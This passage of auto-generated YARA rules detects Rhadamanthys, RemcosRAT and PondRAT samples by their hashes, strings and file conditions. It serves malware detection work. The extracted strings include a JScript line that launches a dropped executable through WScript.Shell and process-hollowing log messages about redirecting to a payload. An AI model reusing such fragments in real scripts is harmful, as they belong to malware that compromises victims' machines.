      description = "_subset_batch - from files Rhadamanthys(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_694ace6e.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_71f4b177.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_a14ca283.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_aaa80a57.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_bb3b307d.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_c2d5e6e9.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_f5139fc2.exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2fa08478b989da7327bcb2c22eefc626126d357de831b8182474ba1ac6240033"
      hash2 = "769de98d15369885e5dd8dac76722a72cab4999c4b6b70b5b111f6735399ce52"
      hash3 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash4 = "694ace6efcabaf0ba32a66581b6e710bf432761f18984891a78b5377109d7ef9"
      hash5 = "71f4b177ab5dbf844397591deda7cbb750b4fc3dda07c10f41ee3d7615278976"
      hash6 = "a14ca283ce205cbc9c1ca540cdfc17ff62e28557de5fa1eedfdddfdd4456b27e"
      hash7 = "aaa80a57fa8ecfcdcec28fec4b338eb015925e2e2b57b4aa910d559bce58199c"
      hash8 = "bb3b307d85e0e4c237c2e2ddd4222f7a93cf769c9064c08cba0940d44d62436a"
      hash9 = "c2d5e6e925c2450d4d5d8cba94c7570049a4da43647165fe9db23e009c977f91"
      hash10 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash11 = "f5139fc2fa5525e89dde9d4d8ccf522bf60a7990fa0e213218a11d1f23c2d7ee"
      hash12 = "5a68af44b9399b0bf6e41e5d60b994251dedb610c700dcfd81198b67a0518d0e"
      hash13 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $s1 = "runtime/rwmutex.go" fullword ascii /* score: '18.00'*/
      $s2 = "runtime.errorAddressString.Error" fullword ascii /* score: '16.00'*/
      $s3 = "sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s4 = "*runtime.errorAddressString" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.pMask.set" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.(*errorAddressString).Error" fullword ascii /* score: '13.00'*/
      $s7 = "runtime/time_nofake.go" fullword ascii /* score: '12.00'*/
      $s8 = "runtime/fastlog2.go" fullword ascii /* score: '12.00'*/
      $s9 = "*runtime.pcHeader" fullword ascii /* score: '12.00'*/
      $s10 = "runtime/mgcsweep.go" fullword ascii /* score: '12.00'*/
      $s11 = "runtime.getMCache" fullword ascii /* score: '11.00'*/
      $s12 = "runtime.panicmemAddr" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.startCheckmarks" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.pMask.read" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.initHighResTimer" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0__88 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_694ace6e.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_71f4b177.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_a14ca283.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_aaa80a57.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_bb3b307d.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_c2d5e6e9.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_f5139fc2.exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash2 = "694ace6efcabaf0ba32a66581b6e710bf432761f18984891a78b5377109d7ef9"
      hash3 = "71f4b177ab5dbf844397591deda7cbb750b4fc3dda07c10f41ee3d7615278976"
      hash4 = "a14ca283ce205cbc9c1ca540cdfc17ff62e28557de5fa1eedfdddfdd4456b27e"
      hash5 = "aaa80a57fa8ecfcdcec28fec4b338eb015925e2e2b57b4aa910d559bce58199c"
      hash6 = "bb3b307d85e0e4c237c2e2ddd4222f7a93cf769c9064c08cba0940d44d62436a"
      hash7 = "c2d5e6e925c2450d4d5d8cba94c7570049a4da43647165fe9db23e009c977f91"
      hash8 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash9 = "f5139fc2fa5525e89dde9d4d8ccf522bf60a7990fa0e213218a11d1f23c2d7ee"
      hash10 = "5a68af44b9399b0bf6e41e5d60b994251dedb610c700dcfd81198b67a0518d0e"
      hash11 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $s1 = "runtime.getlasterror.abi0" fullword ascii /* score: '18.00'*/
      $s2 = "runtime.systemstack_switch.abi0" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.systemstack.abi0" fullword ascii /* score: '14.00'*/
      $s4 = "runtime.mix" fullword ascii /* score: '13.00'*/
      $s5 = "internal/abi.(*IntArgRegBitmap).Get" fullword ascii /* score: '12.00'*/
      $s6 = "runtime.dropm.abi0" fullword ascii /* score: '12.00'*/
      $s7 = "runtime.osinit.abi0" fullword ascii /* score: '10.00'*/
      $s8 = "runtime/hash64.go" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.stackcheck.abi0" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.checkASM.abi0" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.goexit1.abi0" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.unspillArgs" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.morestackc.abi0" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.badmorestackg0.abi0" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.spillArgs.abi0" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__1aae8bf580c846f39c71c05898e57e88_imphash__Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0__89 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2fa08478b989da7327bcb2c22eefc626126d357de831b8182474ba1ac6240033"
      hash2 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash3 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash4 = "5a68af44b9399b0bf6e41e5d60b994251dedb610c700dcfd81198b67a0518d0e"
      hash5 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $s1 = "SiblingLocationNameOrderingByteSizeBitOffsetBitSizeStmtListLowpcHighpcLanguageDiscrDiscrValueVisibilityImportStringLengthCommonR" ascii /* score: '29.00'*/
      $s2 = "strconv.computeBounds" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.mapassign_fast64" fullword ascii /* score: '13.00'*/
      $s4 = "ueCallOriginCallParameterCallPCCallTailCallCallTargetCallTargetClobberedCallDataLocationCallDataValueNoreturnAlignmentExportSymb" ascii /* score: '13.00'*/
      $s5 = "ncodingExternalFrameBaseFriendIdentifierCaseMacroInfoNamelistItemPrioritySegmentSpecificationStaticLinkTypeUseLocationVarParamVi" ascii /* score: '13.00'*/
      $s6 = "strconv.mulByLog2Log10" fullword ascii /* score: '12.00'*/
      $s7 = "strconv.mulByLog10Log2" fullword ascii /* score: '12.00'*/
      $s8 = "efCompDirConstValueContainingTypeDefaultValueInlineIsOptionalLowerBoundProducerPrototypedReturnAddrStartScopeStrideSizeUpperBoun" ascii /* score: '12.00'*/
      $s9 = "runtime.pollInfo.eventErr" fullword ascii /* score: '10.00'*/
      $s10 = "rtualityVtableElemLocAllocatedAssociatedDataLocationStrideEntrypcUseUTF8ExtensionRangesTrampolineCallColumnCallFileCallLineDescr" ascii /* score: '10.00'*/
      $s11 = "runtime.pollInfo.closing" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.pollInfo.expiredWriteDeadline" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.panicunsafeslicenilptr" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.pollInfo.expiredReadDeadline" fullword ascii /* score: '10.00'*/
      $s15 = "ReadFromInet6" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__4b87c9e6_RemcosRAT_signature__4cb48bf0_RemcosRAT_signature__5e879e2b_90 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_4b87c9e6.js, RemcosRAT(signature)_4cb48bf0.js, RemcosRAT(signature)_5e879e2b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4b87c9e69b5afb110449461aa7b3b03d3bf46f28752552ae9a75f90c26f413a9"
      hash2 = "4cb48bf097a05911e6942942b97fe14bf07e6caeafe179687e38c70cbc8887e7"
      hash3 = "5e879e2b6fe23a94b6c4d5ae5e7af5be37ff47d9ed5acc7f12e16797efa942d9"
   strings:
      $s1 = "cmF5Q3JlYXRlAAAAVmFyaWFudENoYW5nZVR5cGUAAABWYXJpYW50Q29weQAAAFZhcmlhbnRDbGVhcgAAAABWYXJpYW50SW5pdABjb21jdGwzMi5kbGwAAAAAX1RyYWNr" ascii /* base64 encoded string 'rayCreate   VariantChangeType   VariantCopy   VariantClear    VariantInit comctl32.dll    _Track' */ /* score: '21.00'*/
      $s2 = "AABJbWFnZUxpc3RfRHJhZ1Nob3dOb2xvY2sAAAAASW1hZ2VMaXN0X0RyYWdNb3ZlAAAAAEltYWdlTGlzdF9EcmFnTGVhdmUAAABJbWFnZUxpc3RfRHJhZ0VudGVyAAAA" ascii /* base64 encoded string '  ImageList_DragShowNolock    ImageList_DragMove    ImageList_DragLeave   ImageList_DragEnter   ' */ /* score: '21.00'*/
      $s3 = "TW91c2VFdmVudAAAAABJbWFnZUxpc3RfU2V0SWNvblNpemUAAABJbWFnZUxpc3RfR2V0SWNvblNpemUAAABJbWFnZUxpc3RfV3JpdGUAAABJbWFnZUxpc3RfUmVhZAAA" ascii /* base64 encoded string 'MouseEvent    ImageList_SetIconSize   ImageList_GetIconSize   ImageList_Write   ImageList_Read  ' */ /* score: '21.00'*/
      $s4 = "YWdlTGlzdF9EZXN0cm95AAAASW1hZ2VMaXN0X0NyZWF0ZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string 'ageList_Destroy   ImageList_Create                                                              ' */ /* score: '21.00'*/
      $s5 = "new ActiveXObject(\"WScript.Shell\").Run(p+\"\\\\x.exe\")" fullword ascii /* score: '19.00'*/
      $s6 = "DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s7 = "AAAAAEltYWdlTGlzdF9HZXRCa0NvbG9yAAAAAEltYWdlTGlzdF9TZXRCa0NvbG9yAAAAAEltYWdlTGlzdF9BZGQAAABJbWFnZUxpc3RfR2V0SW1hZ2VDb3VudAAAAElt" ascii /* base64 encoded string '    ImageList_GetBkColor    ImageList_SetBkColor    ImageList_Add   ImageList_GetImageCount   Im' */ /* score: '17.00'*/
      $s8 = "AABTbGVlcABvbGVhdXQzMi5kbGwAAAAAU2FmZUFycmF5UHRyT2ZJbmRleAAAAFNhZmVBcnJheUdldFVCb3VuZAAAAABTYWZlQXJyYXlHZXRMQm91bmQAAAAAU2FmZUFy" ascii /* base64 encoded string '  Sleep oleaut32.dll    SafeArrayPtrOfIndex   SafeArrayGetUBound    SafeArrayGetLBound    SafeAr' */ /* score: '17.00'*/
      $s9 = "SW1hZ2VMaXN0X0VuZERyYWcAAABJbWFnZUxpc3RfQmVnaW5EcmFnAAAASW1hZ2VMaXN0X1JlbW92ZQAAAABJbWFnZUxpc3RfRHJhd0V4AAAAAEltYWdlTGlzdF9EcmF3" ascii /* base64 encoded string 'ImageList_EndDrag   ImageList_BeginDrag   ImageList_Remove    ImageList_DrawEx    ImageList_Draw' */ /* score: '17.00'*/
      $s10 = "AAAAAEAAAD" ascii /* base64 encoded string '    @  ' */ /* score: '16.50'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                 ' */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                ' */ /* score: '16.50'*/
      $s13 = "AAAAAAAAAAAAAEEAA" ascii /* base64 encoded string '          A ' */ /* score: '16.50'*/
      $s14 = "AEAAAEAAAD" ascii /* base64 encoded string ' @  @  ' */ /* score: '16.50'*/
      $s15 = "AAAAAAEAAAAA" ascii /* base64 encoded string '    @   ' */ /* score: '16.50'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PondRAT_signature__Rhadamanthys_signature__706ff7ceac73ad82a8a11dc2fc70b900_imphash__91 {
   meta:
      description = "_subset_batch - from files PondRAT(signature).elf, Rhadamanthys(signature)_706ff7ceac73ad82a8a11dc2fc70b900(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "973f7939ea03fd2c9663dafc21bb968f56ed1b9a56b0284acf73c3ee141c053c"
      hash2 = "2a34d0ce6c7f3a78f85130b7cddb53d41f94644ded37093b1bd7dee6b7f3bfee"
   strings:
      $s1 = "Failed reading the chunked-encoded stream" fullword ascii /* score: '22.00'*/
      $s2 = "Authorization: %s4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s" fullword ascii /* score: '17.50'*/
      $s3 = "WARNING: failed to save cookies in %s: %s" fullword ascii /* score: '15.50'*/
      $s4 = "Bad login part" fullword ascii /* score: '15.00'*/
      $s5 = "Failed to resolve host '%s' with timeout after %ld ms" fullword ascii /* score: '15.00'*/
      $s6 = "%s.%s.tmp" fullword ascii /* score: '14.00'*/
      $s7 = "# https://curl.se/docs/http-cookies.html" fullword ascii /* score: '14.00'*/
      $s8 = "Unsupported HTTP version (%u.%d) in response" fullword ascii /* score: '13.00'*/
      $s9 = "connect to %s port %u failed: %s" fullword ascii /* score: '13.00'*/
      $s10 = "SOCKS5 connect to %s:%d (remotely resolved)" fullword ascii /* score: '12.50'*/
      $s11 = "Hostname '%s' was found" fullword ascii /* score: '12.00'*/
      $s12 = "Couldn't find host %s in the %s file; using defaults" fullword ascii /* score: '12.00'*/
      $s13 = "SOCKS5: hostname '%s' found" fullword ascii /* score: '12.00'*/
      $s14 = "connection to proxy closed" fullword ascii /* score: '12.00'*/
      $s15 = "No password part in the URL" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 8000KB and pe.imphash() == "706ff7ceac73ad82a8a11dc2fc70b900" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__12c3d365_RemcosRAT_signature__4b87c9e6_RemcosRAT_signature__4cb48bf0_RemcosRAT_signature__5e879e2b_92 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_12c3d365.vbs, RemcosRAT(signature)_4b87c9e6.js, RemcosRAT(signature)_4cb48bf0.js, RemcosRAT(signature)_5e879e2b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "12c3d365008814d16e18a630f7732a6325d9efd9d3cc61508aa78c34e43f4430"
      hash2 = "4b87c9e69b5afb110449461aa7b3b03d3bf46f28752552ae9a75f90c26f413a9"
      hash3 = "4cb48bf097a05911e6942942b97fe14bf07e6caeafe179687e38c70cbc8887e7"
      hash4 = "5e879e2b6fe23a94b6c4d5ae5e7af5be37ff47d9ed5acc7f12e16797efa942d9"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                        ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                        ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */ /* score: '26.50'*/
      $s4 = "3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                        PE  ' */ /* score: '21.00'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s6 = "EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s8 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s10 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                              ' */ /* score: '16.50'*/
      $s11 = "AAAAAAAAAAAD" ascii /* base64 encoded string '        ' */ /* score: '16.50'*/
      $s12 = "FAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */ /* score: '16.50'*/
      $s13 = "AFAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' P          ' */ /* score: '16.50'*/
      $s14 = "AAAAAAAAAAAAAAC" ascii /* base64 encoded string '           ' */ /* score: '16.50'*/
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                               ' */ /* score: '16.50'*/
   condition:
      ( ( uint16(0) == 0x704f or uint16(0) == 0x6176 ) and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__1cf0e310ff7ad39ecc43438ffa3a0bb9_imphash__Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f__93 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
      hash2 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
   strings:
      $s1 = "$System.Console.dll" fullword ascii /* score: '23.00'*/
      $s2 = "[!] Failed to redirect to payload:" fullword wide /* score: '16.00'*/
      $s3 = "[!] Invalid thread handle or payload bas" fullword wide /* score: '16.00'*/
      $s4 = "PSystem.Collections.ICollection.get_Count" fullword ascii /* score: '15.00'*/
      $s5 = "&GetReadNotSupported&GetSeekNotSupported(GetWriteNotSupported" fullword ascii /* score: '15.00'*/
      $s6 = "[!] Failed to get thread context for PE" fullword wide /* score: '15.00'*/
      $s7 = "[*] Processing relocation blocks from 0" fullword wide /* score: '15.00'*/
      $s8 = "[!] Could not get PEB address from contex" fullword wide /* score: '14.00'*/
      $s9 = "psl_get_version" fullword ascii /* score: '12.00'*/
      $s10 = "IsThunkInHeap,TryGetThunkDataAddress" fullword ascii /* score: '12.00'*/
      $s11 = "[!] Failed to get" fullword wide /* score: '12.00'*/
      $s12 = "[!] Failed to update ImageBase in header" fullword wide /* score: '12.00'*/
      $s13 = "[*] Relocation info - Old base: 0" fullword wide /* score: '12.00'*/
      $s14 = "[*] PEB Address from context: 0" fullword wide /* score: '11.00'*/
      $s15 = "[+] Thread context updated successfull" fullword wide /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__e791f8773bf0061740713805d84feea8_imphash__Rhadamanthys_signature__ae9484be27b196745e2c08ee4e8427ca_imp_94 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash2 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $x1 = "System.ComponentModel.Design.IDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" fullword wide /* score: '34.00'*/
      $s2 = "Couldn't get process information from performance counter" fullword wide /* score: '20.00'*/
      $s3 = "Feature requires a process identifier" fullword wide /* score: '18.00'*/
      $s4 = "Process performance counter is disabled, so the requested operation cannot be performed" fullword wide /* score: '16.00'*/
      $s5 = "No process is associated with this object" fullword wide /* score: '15.00'*/
      $s6 = "Process has exited, so the requested information is not available" fullword wide /* score: '15.00'*/
      $s7 = "Unable to enumerate the process modules" fullword wide /* score: '15.00'*/
      $s8 = "Attempt to access the method failed" fullword wide /* score: '14.00'*/
      $s9 = "Attempt to access the type failed" fullword wide /* score: '14.00'*/
      $s10 = "Attempted to read past the end of the stream" fullword wide /* score: '14.00'*/
      $s11 = "Switch.System.Runtime.Serialization.SerializationGuard" fullword wide /* score: '14.00'*/
      $s12 = "waitHandl" fullword wide /* base64 encoded string 'j+Gjwe' */ /* score: '14.00'*/
      $s13 = "BindHandle for ThreadPool failed on this handle" fullword wide /* score: '13.00'*/
      $s14 = "IO operation will not work. Most likely the file will become too long" fullword wide /* score: '12.00'*/
      $s15 = "Operation could destabilize the runtime" fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__b039c588c74493feceed91f3303659a5_imphash__Rhadamanthys_signature__87a63f644cb8a20014ebd30c4ceb01d5_imp_95 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_b039c588c74493feceed91f3303659a5(imphash).dll, Rhadamanthys(signature)_87a63f644cb8a20014ebd30c4ceb01d5(imphash).dll, Rhadamanthys(signature)_be86738a23c271515336a1510dc6f59d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fa0a17558cdffecb14f708aaab196af264cdb80f45b8a4cc5ad3f92cd3c4f78d"
      hash2 = "de9c07923c1e57c3c523277409a430939715f3508beba4436965c8146170df2b"
      hash3 = "a1ba406290af9e2e686894b43499779d6b4f436dd89f5a1f19907845f8ef69e8"
   strings:
      $s1 = "http://tl.symcb.com/tl.crt0" fullword ascii /* score: '17.00'*/
      $s2 = "?Windows8@QOperatingSystemVersion@@2V1@B" fullword ascii /* score: '15.00'*/
      $s3 = "?current@QOperatingSystemVersion@@SA?AV1@XZ" fullword ascii /* score: '15.00'*/
      $s4 = "http://t2.symcb.com0" fullword ascii /* score: '14.00'*/
      $s5 = "http://tl.symcd.com0&" fullword ascii /* score: '14.00'*/
      $s6 = "!https://www.thawte.com/repository0W" fullword ascii /* score: '13.00'*/
      $s7 = "http://tl.symcb.com/tl.crl0" fullword ascii /* score: '13.00'*/
      $s8 = "!http://t1.symcb.com/ThawtePCA.crl0" fullword ascii /* score: '13.00'*/
      $s9 = "?string@QSystemError@@SA?AVQString@@W4ErrorScope@1@H@Z" fullword ascii /* score: '10.00'*/
      $s10 = "The Qt Company Oy1" fullword ascii /* score: '9.00'*/
      $s11 = "The Qt Company Oy0" fullword ascii /* score: '9.00'*/
      $s12 = "?machineHostName@QSysInfo@@SA?AVQString@@XZ" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__cc8ee04d9f6a0812cc52d3cecac318d2_imphash__RemcosRAT_signature__dcd2b16697810507d442c9bf8a9e913a_imphas_96 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe, RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash2 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
      hash3 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash4 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
      hash5 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
   strings:
      $s1 = "System.Runtime, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '27.00'*/
      $s2 = "&InitCultureDataCore InitUserOverride$GetTimeFormatsCore@" fullword ascii /* score: '17.00'*/
      $s3 = "Switch.System.Globalization.EnforceLegacyJapaneseDateParsin" fullword wide /* score: '14.00'*/
      $s4 = "Switch.System.Runtime.Serialization.SerializationGuar" fullword wide /* score: '14.00'*/
      $s5 = "SetHashCode.InitializeCurrentThread" fullword ascii /* score: '13.00'*/
      $s6 = "System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerializatio" fullword wide /* score: '13.00'*/
      $s7 = "System.Xml.XmlResolver.IsNetworkingEnabledByDefaul" fullword wide /* score: '13.00'*/
      $s8 = "get_ShortTimes0DeriveShortTimesFromLong.StripSecondsFromPattern>GetIndexOfNextTokenAfterSeconds" fullword ascii /* score: '12.00'*/
      $s9 = "FreeLibrary4GetFileAttributesExPrivate" fullword ascii /* score: '12.00'*/
      $s10 = "ValueFactory attempted to access the Value property of this instance" fullword wide /* score: '11.00'*/
      $s11 = "$get_IsValueCreated" fullword ascii /* score: '9.00'*/
      $s12 = "GetValueNames@" fullword ascii /* score: '9.00'*/
      $s13 = "uP<UseDllDirectoryForDependencies" fullword ascii /* score: '9.00'*/
      $s14 = "EnglishEraNames$IcuGetJapaneseEras.GetJapaneseEraStartDate" fullword ascii /* score: '9.00'*/
      $s15 = "GetNativeDigits" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

